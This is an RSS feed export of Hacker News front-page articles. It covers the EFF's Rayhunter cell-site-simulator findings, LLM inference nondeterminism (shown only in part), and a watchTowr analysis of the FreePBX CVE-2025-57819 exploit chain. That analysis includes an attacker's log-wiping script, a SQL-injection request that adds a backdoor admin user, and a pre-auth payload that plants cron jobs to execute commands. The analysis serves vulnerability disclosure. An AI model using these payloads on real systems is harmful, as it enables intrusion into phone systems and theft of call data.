<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Hacker News: Front Page</title>
        <link>https://news.ycombinator.com/</link>
        <description>Hacker News RSS</description>
        <lastBuildDate>Wed, 10 Sep 2025 19:26:48 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>github.com/Prabesh01/hnrss-content-extract</generator>
        <language>en</language>
        <atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/frontpage.rss" rel="self" type="application/rss+xml"/>
        <item>
            <title><![CDATA[Rayhunter: IMSI Catchers We Have Found So Far]]></title>
            <link>https://www.eff.org/deeplinks/2025/09/rayhunter-what-we-have-found-so-far</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45201988</guid>
            <description><![CDATA[A little over a year ago we released Rayhunter, our open source tool designed to detect cell-site simulators. We’ve been blown away by the level of community engagement on this project. It has been installed on thousands of devices (or so we estimate, we don’t actually know since Rayhunter doesn’t...]]></description>
            <content:encoded><![CDATA[
            
  
  
  A little over a year ago we released Rayhunter, our open source tool designed to detect cell-site simulators. We’ve been blown away by the level of community engagement on this project. It has been installed on thousands of devices (or so we estimate, we don’t actually know since Rayhunter doesn’t have any telemetry!). We have received dozens of packet captures, hundreds of improvements, both minor and major, documentation fixes, and bug reports from our open source community. This project is a testament to the power and impact of open source and community driven counter-surveillance.  
If this is your first time hearing about Rayhunter, you can read our announcement blog post here. Or if you prefer, you can watch our DEF CON talk. In short, Rayhunter is an open source Linux program that runs on a variety of mobile hotspots (dedicated devices that use a cellular connection to give you Wi-Fi). Rayhunter’s job is to look for cell-site simulators (CSS), a tool police use to locate or identify people's cell phones, also known as IMSI catchers or Stingrays. Rayhunter analyzes the “handshakes” between your Rayhunter device and the cell towers it is connected to for behaviors consistent with that of a CSS. When it finds potential evidence of a CSS it alerts the user with an indicator on the screen and potentially a push notification to their phone.  
Understanding if CSS are being used to spy on protests is one of the main goals of the Rayhunter project. Thanks to members of our community bringing Rayhunter to dozens of protests, we are starting to get a picture of how CSS are currently being used in the US. So far Rayhunter has not turned up any evidence of cell-site simulators being used to spy on protests in the US — though we have found them in use elsewhere.  
So far Rayhunter has not turned up any evidence of cell-site simulators being used to spy on protests in the US.  


There are a couple of caveats here. First, it’s often impossible to prove a negative. Maybe Rayhunter just hasn’t been at protests where CSS have been present. Maybe our detection signatures aren’t picking up the techniques used by US law enforcement. But we’ve received reports from a lot of protests, including pro-Palestine protests, protests in Washington DC and Los Angeles, as well as the ‘No Kings’ and ‘50501’ protests all over the country. So far, we haven’t seen evidence of CSS use at any of them.  
A big part of the reason for the lack of CSS at protests could be that some courts have required a warrant for their use, and even law enforcement agencies not bound by these rulings have policies that require police to get a warrant. CSS are also costly to buy and use, requiring trained personnel to use nearly one million dollars worth of equipment.  
The fact is police also have potentially easier to use tools available. If the goal of using a CSS at a protest is to find out who was at the protest, police could use tools such as:  

License plate readers to track the vehicles arriving and leaving at the protest. 
Location data brokers, such as Locate X and Fog Data Science, to track the phones of protestors by their mobile advertising IDs (MAID).
Cellebrite and other forensic extraction tools to download all the data from phones of arrested protestors if they are able to unlock those phones.  
Geofence warrants, which require internet companies like Google to disclose the identifiers of devices within a given location at a given time.
Facial recognition such as Clearview AI to identify all present via public or private databases of peoples faces.
Tower dumps from phone companies, which, similar to geofence warrants, require phone companies to turn over a list of all the phones connected to a certain tower at a certain time.  

We think, due to the lack of evidence of CSS being used, protestors can worry less about CSS and more about these other techniques. Luckily, the actions one should take to protect themselves are largely the same: 

To protect yourself against Locate X and Fog you can turn off location services on your phone (iPhone and Android). 
To protect yourself from Cellebrite you can use a strong password, turn off biometric unlocks, and keep your phone up to date. 
To protect against facial recognition, you can wear a mask. 
To protect against tower dumps put your phone into airplane mode (though especially high risk individuals may want to use a Faraday bag instead). 

We feel pretty good about Rayhunter’s detection engine, though there could still be things we are missing. Some of our confidence in Rayhunter’s detection engine comes from the research we have done into how CSS work. But the majority of our confidence comes from testing Rayhunter against a commercial cell-site simulator thanks to our friends at Cape. Rayhunter detected every attack run by the commercial CSS.  
Where Rayhunter Has Detected Likely Surveillance
Rayhunter users have found potential evidence of CSS being used in the wild, though not at protests. One of the most interesting examples that triggered multiple detections and even inspired us to write some new detection rules was at a cruise port in the Turks and Caicos Islands. The person who captured this data put the packet captures online for other researchers to review. 
Rayhunter users have detected likely CSS use in the US as well. We have received reports from Chicago and New York where our “IMSI Sent without authentication” signature was triggered multiple times over the course of a couple hours and then stopped. Neither report was in the vicinity of a protest. We feel fairly confident that these reports are indicative of a CSS being present, though we don’t have any secondary evidence to back them up. 
We have received other reports that have triggered our CSS detection signatures, but the above examples are the ones we feel most confident about.  
We encourage people to keep using Rayhunter and continue bringing it to protests. Law enforcement trends can change over time and it is possible that some cities are using them more often than others (for example Fontana, California reportedly used their CSS over 300 times in two years). We also know that ICE still uses CSS and has recently renewed their contracts. Interestingly, in January, the FBI requested a warrant from the Foreign Intelligence Surveillance Court to use what was likely a CSS and was rejected. This was the first time the FBI has sought a warrant to use a CSS using the Foreign Intelligence Surveillance Act since 2015, when the Justice Department began requiring a warrant for their use. If police start using CSS to spy on protests we want to know.
There is still a lot we want to accomplish with Rayhunter, we have some future plans for the project that we are very excited to share with you in the near future, but the biggest thing we need right now is more testing outside of the United States.  
Taking Rayhunter International  
We are interested in getting Rayhunter data from every country to help us understand the global use of CSS and to refine our signatures. Just because CSS don't appear to be used to spy on protests in the US right now doesn't mean that is true everywhere. We have also seen that some signatures that work in the US are prone to false positives elsewhere (such as our 2G signature in countries that still have active 2G networks). The first device supported by Rayhunter, the Orbic hotspot, was US only, so we have very little international data. But we now have support for multiple devices! If you are interested in Rayhunter, but can’t find a device that works in your country, let us know. We recommend you consult with an attorney in your country to determine whether running Rayhunter is likely to be legally risky or outlawed in your jurisdiction.



          
    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Insufficiently sanitized data allows unauthenticated access to FreePBX Admin]]></title>
            <link>https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45201474</guid>
            <description><![CDATA[We’re back - it’s a day, in a month, in a year - and once again, something has happened.

In this week’s episode of “the Internet is made of string and there is literally no evidence to suggest otherwise”, we present even further evidence that as a species we made a fairly painful mistake when we discovered electricity - and it just got worse and worse.

Today, inside this hellscape we call the Internet, a mean person has discovered a zero-day(s) in FreePBX (now lovingly called CVE-2025-57819).]]></description>
            <content:encoded><![CDATA[
            We’re back - it’s a day, in a month, in a year - and once again, something has happened.In this week’s episode of “the Internet is made of string and there is literally no evidence to suggest otherwise”, we present even further evidence that as a species we made a fairly painful mistake when we discovered electricity - and it just got worse and worse.Today, inside this hellscape we call the Internet, a mean person has discovered a zero-day(s) in FreePBX (now lovingly called CVE-2025-57819). But they didn’t stop there - the dastardly individual(s) then proceeded to exploit FreePBX hosts en-masse.As these stories sometimes play out, the ruse was rumbled when pesky sysadmins started posting to the FreePBX Community Forums, complaining of broken installs and other nonsense.You decided to use FreePBX instead of Microsoft Teams, and now you have to live with the consequences.Is This A FreePBX?FreePBX is an open-source, web-based GUI that manages and controls the Asterisk VoIP phone system. Most of the code is wide open - you can spin up an appliance with a bash script or ISO and browse the PHP to your heart’s content. Some commercial add-on modules, though, are locked up behind ionCube Loader.FreePBX isn’t just a toy project either - it’s used by everyone from home lab hobbyists to MSPs to full-blown enterprises.As we’ve seen continuously - attackers love tapping communications. Earlier in 2025, the industry was overwhelmed with news about Salt Typhoon compromising telcos and lawful-interrcept systems at scale to intercept calls.A compromise of FreePBX represents the same - access to phone calls, voicemails, recordings… (and the benefit of access to a privileged and likely trusted host in an interesting environment).The Timeline Of Panic - It BeginsAs always in life, everything interesting is ruined by someone asking questions.On the 25th August 2025, someone did exactly that. The cheek!Once we traversed their whining, the user did share some interesting information - they were seeing the following error when trying to access their FreePBX instance:PHP Fatal error: Uncaught Error: Class “Symfony\\Component\\Console\\Application” not found in /var/www/html/admin/libraries/FWApplication.class.php:11
Stack trace:
#0 /var/lib/asterisk/bin/fwconsole(66): include()
#1 {main}
thrown in /var/www/html/admin/libraries/FWApplication.class.php on line 1
While there is probably a joke here about this being what you might expect from a PHP application, things became interesting as other users began to chime in that they were also observing the same error on their appliance.The Timeline Of Panic - It Gets WorseA further turn was taken when, a day later (August 26, 2025) a user shared the contents of .clean.sh, a new file that had appeared on their phone call box that contained the following contents:# cat .clean.sh
#!/bin/bash

LOGS=(
    "/var/log/asterisk/fail2ban"
    "/var/log/asterisk/freepbx_security.log"
    "/var/log/secure"
    "/var/log/httpd/error_log*"
    "/var/log/vsftpd.log"
    "/var/log/httpd/access_log*"
    "/var/log/apache2/access.log*"
    "/var/log/apache2/error.log*"
    "/var/log/openvpn.log"
    "/var/log/*"
)

for log in "${LOGS[@]}"; do
    find "$(dirname "$log")" -name "$(basename "$log")" -type f 2>/dev/null | while read -r file; do
        echo "Processing file: $file"
        sed -i --follow-symlinks             -e '/$SERVICE_NAME/d'             -e '/\\.cache/d'             -e '/\\modular\\.php/d'             -e '/\\monitor\\.php/d'             -e '/\\backend\\.php/d'             "$file"
    done
done

rm $0
To quote an enlightened poster:I think we have a serious issue …That’s right, you do appear to have a serious issue, friend!.clean.sh is pretty clearly a bash cleanup script designed to wipe evidence after backdoor access. It walks a bunch of log locations and scrubs references to common web shell paths and service names, then deletes itself. In other words, classic post-exploitation TTPs aimed at log tampering to hide web shell activity.And it turns out this wasn’t a one-off. The same .clean.sh script - along with assorted web shells - had been popping up across FreePBX installs, with evidence of activity going back to August 21, 2025.The Timeline Of Panic - It Gets WorsererThe takeaway from that community thread was clear - something nasty was brewing in the FreePBX world, almost certainly an unknown Remote Code Execution vulnerability.Editors note: Or, perhaps, just more intended functionality? ;-)What we’ve omitted to mention until this point is that we (watchTowr) have a little bit of experience working with FreePBX on security issues.We reported a Post-Authenticated Command Injection vulnerability (CVE-2025-55211) to FreePBX in May 2025. Despite cruising past our 90-day disclosure window, it still hasn't been published.The response we received? Well….Your friendly informational post-auth RCE vulnerability - give us strength…..Imagine our surprise when we saw panic quickly give way to action, with the FreePBX development team posting updates.Their advice? Lock down access to the admin panel with IP whitelisting or firewall rules, and apply an out-of-band patch to one of the modules.Additionally, there is now EDGE module fix for testing – please note that this has not gone through full normal QA, but we will be doing so ASAP and including as part of normal security release.

FreePBX users on v16 or v17 can run:

$ fwconsole ma downloadinstall endpoint --edge

PBXAct v16 users can run:

$ fwconsole ma downloadinstall endpoint --tag 16.0.88.19

PBXAct v17 users can run:

$ fwconsole ma downloadinstall endpoint --tag 17.0.2.31
And associated vulnerability summary and description - giving us new clues. What is this Endpoint module and why must we once again be forced to reverse engineer cryptic clues about intended functionality?Vulnerability SummaryInsufficiently sanitized user-supplied data allows unauthenticated access to FreePBX Administrator leading to arbitrary database manipulation and remote code execution.Starting on or before August 21st, 2025, an unauthorized user began accessing multiple FreePBX version 16 and 17 systems that were connected directly to the public internet -- systems with inadequate IP filtering/ACLs -- by exploiting a validation/sanitization error in the processing of user-supplied input to the commercial "endpoint" module. This initial entry point was then chained with several other steps to ultimately gain potentially root level access on the target systems.What Is The Endpoint Module?Before we continue, let’s provide some very brief context on this Endpoint module for FreePBX. It is important to note that it is a commercial add-on.The Endpoint Manager module in FreePBX is a commercial add-on that simplifies provisioning and managing VoIP phones. It provides a centralized interface where administrators can configure templates, assign extensions, and push settings directly to supported devices without needing to manually edit configuration files or log into each phone.The module supports a wide range of vendors, allows for bulk updates, and integrates with FreePBX’s extension management to streamline deployments and maintenance of SIP endpoints across an organization.Time For ActionGetting bored of curating the most perfectest memes, we decided to once again rapidly dive in with our two-pronged approach:Deploy, into Attacker Eye (our global sensor network), a fully-monitored (disk/memory/network) FreePBX sensorBegin reverse engineering code changesWe Swear, It Fell Off A TruckA quick patched vs unpatched comparison made one thing obvious: everything that changed lives inside the Endpoint module.But, as always, we first need to understand how FreePBX actually functions given purposeful .htaccess rules blocking direct access to the majority of files:<IfModule mod_authz_core.c>
	# Disallow all . files, such as .htaccess or .git
	<FilesMatch "\\..*$">
		Require all denied
	</FilesMatch>
	# Allow index, config, and ajax.php, as well as all our image types.
	<FilesMatch "(^$|index\\.html|index\\.php|config\\.php|ajax\\.php|\\.(map|gif|GIF|jpg|jpeg|png|css|js|swf|txt|ico|ttf|svg|eot|woff|woff2|wav|mp3|aac|ogg|webm|gz|map)$)">
		Require all granted
	</FilesMatch>
</IfModule>
Using this .htaccess rules above, we now know the FreePBX PHP endpoints within the main directory /admin/ that can be reached are:/admin/ajax.php/admin/config.phpThey’re not exactly single-file scripts, and the call stacks go deep, so instead of making our lives difficult we decided to do what we do best - click around the UI to see how they behave in practice, hoping to really understand how FreePBX routes requests to modules.Numerous requests appeared, primarily following the patterns listed below:GET /admin/ajax.php?module=sms&command=getJSON&jdata=grid&search= HTTP/1.1
GET /admin/config.php?display=sms
We poked at /admin/ajax.php to see if it was reachable without a session. Short answer: no.For example, sending this request with no valid cookies…GET /admin/ajax.php?module=endpoint&command=watchTowr HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
Swiftly, an HTTP 401 response hits us in the face.HTTP/1.1 401 Unauthorized
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control, X-Auth-Token
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: $url
Access-Control-Max-Age: 86400
Allow: GET
Content-Length: 29
Content-Type: application/json

{"error":"Not Authenticated"}
This is due to a code block in admin/libraries/BMO/Ajax.class.php which checks for the presence of a valid session:		// Check authentication if set to
		if ($this->settings['authenticate']) {
			if (!isset($_SESSION['AMP_user'])) {
				$this->ajaxError(401, 'Not Authenticated');
			} else {
				if (!defined('FREEPBX_IS_AUTH')) {
					define('FREEPBX_IS_AUTH', 'TRUE');
				}
			}
		}
However, the code block just before caught our eye - if a request comes from localhost then authentication is disregarded as some sort of meaningless annoyance:	// If the request has come from this machine then no need to authenticate.
	$request_from_ip = $_SERVER['REMOTE_ADDR'];
	if (($request_from_ip == '127.0.0.1') || ($request_from_ip == '::1')) {
		$this->settings['authenticate'] = false;
	}
Taking this as a sign, we followed a hunch and burnt through a lot of time hunting for an SSRF that would allow us to control/send requests from localhost - but no, we are not that lucky.We just wanted to access more intended functionality!A Different Approach!With the pre-auth angle looking like a dead end, we flipped the problem around – could we at least poke the module once authenticated?Even with the code obfuscated, grepping for references to the Endpoint module gave us enough to craft a request. Each time we attempted to probe the module, FreePBX would whine and complain about missing modules - so, doing as we were told, we could just append parameters and provide nonsense values as we went along:GET /admin/ajax.php?command=model&module=endpoint&template=watchTowr1&brand=watchTowr2&model=watchTowr3 HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
Cookie: PHPSESSID=td3cogljn6ka24glielo37s0uv

Following the clues of the vulnerability summary, we jut threw a few random ' into parameters to see what would happen.GET /admin/ajax.php?command=model&module=endpoint&template=watchTowr1&brand=watchTowr2'&model=watchTowr3 HTTP/1.1
Host: {{Hostname}}
Referer: http://{{Hostname}}/admin/config.php
Cookie: PHPSESSID=td3cogljn6ka24glielo37s0uv

HTTP/1.1 500 Internal Server Error
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json
Content-Length: 400

{"error":{"type":"Exception","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'watchTowr1' AND (`key` LIKE 'watchTowr3%' OR `key` LIKE 'EXP%' )' at line 1::","code":0,"file":"\\/var\\/www\\/html\\/admin\\/libraries\\/utility.functions.php","line":123}}
Editors note: As FreePBX have told us and thus following the same train of thought, this is intended functionality and at best informational.Sifting For GoldBriefly perusing logs from our Attacker Eye FreePBX sensor, and filtering out the absolute junk created by AI-generated emoji-drenched ‘PoCs’, we found something interesting:POST /admin/ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Referer: http://{{Hostname}}/admin/config.php
Content-Length: 382

module=%5cFreePBX%5cmodules%5cEndpoint%5cajax&command=model&model=model&template=template&brand=brand'%3bINSERT%20INTO%20ampusers%20(username%2c%20email%2c%20extension%2c%20password_sha1%2c%20extension_low%2c%20extension_high%2c%20deptname%2c%20sections)%20VALUES%20('ampuser'%2c%20''%2c%20''%2c%20'censored'%2c%20''%2c%20''%2c%20''%2c%20'%3bcli')%3b
Carefully, we took that exact request, pointed it at our own lab instance, and – much to our amusement – a shiny new backdoor user named ampuser popped into existence, lining up perfectly with the IoCs FreePBX community members had already been reporting.There it is, the whole exploit chain for installing a backdoor user, instead of our instance RCE.This is a valid payload to exploit the SQL Injection exploitation, notably however without any authentication!How does it work, though? Let’s find out.Reaching Modules Pre-AuthAt this stage, we’ve got two critical puzzle pieces:We know how to hit the post-auth SQL Injection in the FreePBX Endpoint module.Our honeypot has captured a malicious request that somehow hits /admin/ajax.php without any authentication.Sure, we could just glue those together and call it a day – instant exploit chain, done.But that wouldn’t satisfy our curiosity. How on earth does an unauthenticated user manage to reach ajax.php in the first place?To answer that, we need to rewind and look at the basics. What actually happens when you call:GET /admin/ajax.php?module=somemodule&command=andcommand

Time to dig into /admin/ajax.php itself and see how requests are handled./**
 * BMO Ajax handler.
 *
 * Does not support older modules.
 */
if (!isset($_REQUEST['module'])) {
        $module = "framework";
} else {
        $module = $_REQUEST['module'];
}

if (isset($_REQUEST['command'])) {
        $command = $_REQUEST['command'];
} else {
        $command = "unset";
}

//...

$bmo->Ajax->doRequest($module, $command); // [1]
At [1], the code takes our supplied module and command parameters and hands them off to libraries/BMO/Ajax.class.php, specifically into its doRequest method for processing.public function doRequest($module = null, $command = null) {
        if (!$module || !$command) {
                throw new \\Exception("Module or Command were null. Check your code.");
        }

        if (class_exists(ucfirst($module)) && $module != "directory") {
                throw new \\Exception("The class $module already existed. Ajax MUST load it, for security reasons");
        }

        // Is someone trying to be tricky with filenames?
        if (strpos($module, ".") !== false) {
                throw new \\Exception("Module requested invalid");
        }
        // Is it the hardcoded Framework module?
        if ($module == "framework") { 
                $file = $this->Config->get_conf_setting('AMPWEBROOT')."/admin/libraries/BMO/Framework.class.php";
                $ucMod = "Framework"; 
        } elseif ($module == "search") { // Ajax Search plugin
                $file = $this->Config->get_conf_setting('AMPWEBROOT')."/admin/libraries/BMO/Search.class.php";
                $ucMod = "Search";
        } else {
                $ucMod = ucfirst($module);
                $ucMod = str_replace("-","dash",$ucMod);
                $file = $this->Config->get_conf_setting('AMPWEBROOT')."/admin/modules/$module/$ucMod.class.php";
        }

        // Note, that Self_Helper will throw an exception if the file doesn't exist, or if it does
        // exist but doesn't define the class.
        $this->injectClass($ucMod, $file); // [1]
        //...
 }
At [1], the doRequest method calls a helper named injectClass. This helper dives into reflection logic, attempting to resolve and load the correct class for the requested module.This is where we went nuts, trying to understand the reflection implementation - as always though, it was much simpler than we expected.The vulnerability sits right at the start of doRequest, in a deceptively simple check.if (class_exists(ucfirst($module)) && $module != "directory")
This is… not great. The condition just drops the attacker-controlled module parameter straight into class_exists. But why does that matter?At first glance, it seems harmless - just a class name lookup. But when we actually checked the PHP documentation, we realized something important: class_exists doesn’t just take a single argument. It accepts a second argument: autoload.If autoload is true, PHP will happily try to automatically load whatever class name you feed it. Since the default is true, our attacker-controlled input into class_exists means PHP will go looking for a class file on disk.But here’s the twist: we don’t actually care about loading a class. What we really want is for PHP to execute a static script like admin/modules/endpoint/ajax.php. That’s where FreePBX’s custom magic enters the scene.Inside functions.inc.php - a helper file loaded early in execution - FreePBX registers its own autoloader:spl_autoload_register('fpbx_framework_autoloader');
According to the official documentation, this function lets you register your own custom handlers for class autoloading. In practice, that means when class_exists is called, the attacker-supplied module parameter is handed straight over to the fpbx_framework_autoloader function.//freepbx autoloader
function fpbx_framework_autoloader($class) {
  if ($class === true) {
          // Deprecated - true USED to mean 'load all modules'
          return false;
  }

  // Handle guielements
  if (substr($class, 0, 3) == 'gui') {
          $class = 'component';
  }

  // FreePBX Module autoloader
  if (stripos($class, 'FreePBX\\\\modules\\\\') === 0) { // [1]
          // Trim the front
          $req = substr($class, 16); // [2]
          
          // If there's ANOTHER slash in the request, we want to try to autoload
          // the file.
          $modarr = explode('\\\\', $req); // [3]
          if (!isset($modarr[1])) {
                  // TODO: Add *real* module autoloader here in FreePBX 15, replacing the BMO __get() autoloader
                  return;
          }
          // This is a basic implementation of PSR4 under ..admin/modules/modulename/.. so that
          // a request for \\FreePBX\\modules\\Ucp\\Widgets\\Ponies would look for a file
          // called ..admin/modules/ucp/Widgets/Ponies.php and then load it, if it exists.
          $moddir = \\FreePBX::Config()->get('AMPWEBROOT')."/admin/modules/".strtolower(array_shift($modarr))."/"; // [4]

          $filepath = $moddir.join("/", $modarr).".php"; // [5]

          if (file_exists($filepath)) {
                  include $filepath; // [6]
          }
          // Always return here, as there's nothing left to try.
          return;
  }
  //...
}
				
Let’s say we specify module as FreePBX\\modules\\endpoint\\install.At [1], the code checks if our module starts with FreePBX\\modules. If it does, we move into the interesting path.At [2], it strips away the FreePBX\\modules prefix, leaving just endpoint\\install.At [3], the string is split into an array (modarr) using the backslash separator.At [4], it builds a path to the webroot and tacks on the first element of that array. In a default FreePBX setup, this gives /var/www/html/admin/modules/endpoint/.At [5], it takes the last element from the array (install) and adds .php.In our case, the filepath is now equal to:/var/www/html/admin/modules/endpoint/install.phpEverything becomes clear at [6], where our file… is just included.This is it! The custom FreePBX class loader allows you to include any file ending with the .php extension from the admin/modules location!Put simply: attackers can hit certain module files directly without needing to authenticate.Additional note. You can only reach files ending with .php, like ajax.php. You are not able to include files with additional dots, like Endpoint.class.php. This is because an additional filtering exists and module parameter cannot contain a dot character.So, let’s put it to the test. If we try to reach the install.php file from the Endpoint module pre-auth, we can send a request like this:GET /admin/ajax.php?module=FreePBX\\modules\\Endpoint\\install&command=watchTowr HTTP/1.1
Host: freepbx.lab
And, as expected, we get an error - proving that we have reached our target code path:HTTP/1.0 500 Internal Server Error
...

{"error":{"type":"Whoops\\\\Exception\\\\ErrorException","message":"Cannot redeclare getdefaultaddress()","code":1,"file":"\\/var\\/www\\/html\\/admin\\/modules\\/endpoint\\/install.php","line":4280}}
Finally, we can just use this to exploit the SQL Injection that we saw in-the-wild:GET /admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&model=model&template=template&brand=brand' HTTP/1.1
Host: freepbx.lab

And, again, as expected the response proving we can hit the vulnerable code:HTTP/1.1 500 Internal Server Error
...

{"error":{"type":"Exception","message":"SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'template' AND (`key` LIKE 'model%' OR `key` LIKE 'EXP%' )' at line 1::","code":0,"file":"\\/var\\/www\\/html\\/admin\\/libraries\\/utility.functions.php","line":123}}
And that’s the punchline. A couple of takeaways here:The official patch focuses narrowly on fixing the SQL Injection in the Endpoint module.But the bigger issue – this “authentication bypass” quirk that lets you include .php files pre-auth – sits in the core FreePBX code untouched.Which means even fully patched systems still expose a juicy attack surface: attackers can directly hit certain module .php files without logging in.Not exactly the root-cause fix we’d hope for. More like a band-aid over a leaky pipe.But maybe that’s what the FreePBX intended?SQL Injection to Remote Code ExecutionListening to words of wisdom, we set out to turn this shiny SQL Injection into full-blown RCE. Honestly, it felt less like an epic boss battle and more like a side quest - “deliver this item to your friend across town.”Check what the database user (asterisk) can actually do.Could it upload files, run dangerous MySQL commands, or otherwise make our lives easy? Sadly no – some hardening had been applied, so privileges were limited.Poke through the existing tables for something useful.And that’s when we spotted it – a table that practically waved at us and whispered: “exploit me.”Tables called cron_jobs always sound fun:And honestly, it doesn’t get much simpler than this.All we need to do is drop a new row into the cron_jobs table. We set the command field to whatever payload we want executed, and give schedule the good old * * * * * treatment so it runs every minute.The final request ends up looking like this:GET /admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','watchTowr','id+>+/tmp/watchTowr',NULL,'*+*+*+*+*',30,1,1)+--+ HTTP/1.1
Host: freepbx.lab

After a while, we can see our command executed and the entire chain is completed.Detection Artefact GeneratorToday, we are publishing our Detection Artefact Generator which you can find here.This DAG attempts to create a new row within the cron_jobs table, triggering the writing of a webshell:If this fails, the DAG adds a new user:Maybe this was all intended functionality?
            The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.

            By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: time to respond.
            
                    
                        
                            Gain early access to our research, and understand your exposure, with the watchTowr Platform
                            REQUEST A DEMO
                        
                    
                 
        ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Delphi 13 Florence Released]]></title>
            <link>https://blogs.embarcadero.com/announcing-the-availability-of-rad-studio-13-florence/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45201372</guid>
        </item>
        <item>
            <title><![CDATA[Defeating Nondeterminism in LLM Inference]]></title>
            <link>https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45200925</guid>
            <description><![CDATA[Reproducibility is a bedrock of scientific progress. However, it’s remarkably difficult to get reproducible results out of large language models.
For example, you might observe that asking ChatGPT the same question multiple times provides different results. This by itself is not surprising, since getting a result from a language model involves “sampling”, a process that converts the language model’s output into a probability distribution and probabilistically selects a token.
What might be more surprising is that even when we adjust the temperature down to 0This means that the LLM always chooses the highest probability token, which is called greedy sampling. (thus making the sampling theoretically deterministic), LLM APIs are still not deterministic in practice (see past discussions here, here, or here). Even when running inference on your own hardware with an OSS inference library like vLLM or SGLang, sampling still isn’t deterministic (see here or here).]]></description>
            <content:encoded><![CDATA[
    
    
    
    Reproducibility is a bedrock of scientific progress. However, it’s remarkably difficult to get reproducible results out of large language models.
For example, you might observe that asking ChatGPT the same question multiple times provides different results. This by itself is not surprising, since getting a result from a language model involves “sampling”, a process that converts the language model’s output into a probability distribution and probabilistically selects a token.
What might be more surprising is that even when we adjust the temperature down to 0This means that the LLM always chooses the highest probability token, which is called greedy sampling. (thus making the sampling theoretically deterministic), LLM APIs are still not deterministic in practice (see past discussions here, here, or here). Even when running inference on your own hardware with an OSS inference library like vLLM or SGLang, sampling still isn’t deterministic (see here or here).
But why aren’t LLM inference engines deterministic? One common hypothesis is that some combination of floating-point non-associativity and concurrent execution leads to nondeterminism based on which concurrent core finishes first. We will call this the “concurrency + floating point” hypothesis for LLM inference nondeterminism. For example, a recent arXiv preprint writes:

Floating-point arithmetic in GPUs exhibits non-associativity, meaning $(a + b) + c \neq a + (b + c)$ due to finite precision and rounding errors. This property directly impacts the computation of attention scores and logits in the transformer architecture, where parallel operations across multiple threads can yield different results based on execution order.


You can also find the “concurrency + floating point” hypothesis repeated by others, like here (“There are speed tradeoffs, and in order to make the endpoints fast GPUs are used, which do parallel [nondeterministic] calculations. Any modern GPU neural net calculations will be subject to these."), or here (“Because GPUs are highly parallelized, the ordering of additions or multiplications might be different on each execution, which can cascade into small differences in output.").
While this hypothesis is not entirely wrong, it doesn’t reveal the full picture. For example, even on a GPU, running the same matrix multiplication on the same data repeatedly will always provide bitwise equal results. We’re definitely using floating-point numbers. And our GPU definitely has a lot of concurrency. Why don’t we see nondeterminism in this test?
A = torch.randn(2048, 2048, device='cuda', dtype=torch.bfloat16)
B = torch.randn(2048, 2048, device='cuda', dtype=torch.bfloat16)
ref = torch.mm(A, B)
for _ in range(1000):
    assert (torch.mm(A, B) - ref).abs().max().item() == 0
To understand the true cause of LLM inference nondeterminism, we must look deeper.
Unfortunately, even defining what it means for LLM inference to be deterministic is difficult. Perhaps confusingly, the following statements are all simultaneously true:

Some kernels on GPUs are nondeterministic.
However, all the kernels used in a language model’s forward pass are deterministic.
Moreover, the forward pass of an LLM inference server (like vLLM) can also be claimed to be deterministic.
Nevertheless, from the perspective of anybody using the inference server, the results are nondeterministic.

In this post, we will explain why the “concurrency + floating point” hypothesis misses the mark, unmask the true culprit behind LLM inference nondeterminism, and explain how to defeat nondeterminism and obtain truly reproducible results in LLM inference.
The original sin: floating-point non-associativity
Before talking about nondeterminism, it’s useful to explain why there are numerical differences at all. After all, we typically think of machine learning models as mathematical functions following structural rules such as commutativity or associativity. Shouldn’t there be a “mathematically correct” result that our machine learning libraries should provide us?
The culprit is floating-point non-associativity. That is, with floating-point numbers:
$$ (a + b) + c \neq a + (b + c) $$(0.1 + 1e20) - 1e20
>>> 0
0.1 + (1e20 - 1e20)
>>> 0.1
Ironically, breaking associativity is what makes floating-point numbers useful.
Floating-point numbers are useful because they allow for a “dynamic” level of precision. For the purposes of explanation, we will use base 10 (instead of binary), where floating-point numbers are in the format $\text{mantissa} * 10^\text{exponent}$. We will also use 3 digits for the mantissa and 1 digit for the exponent.
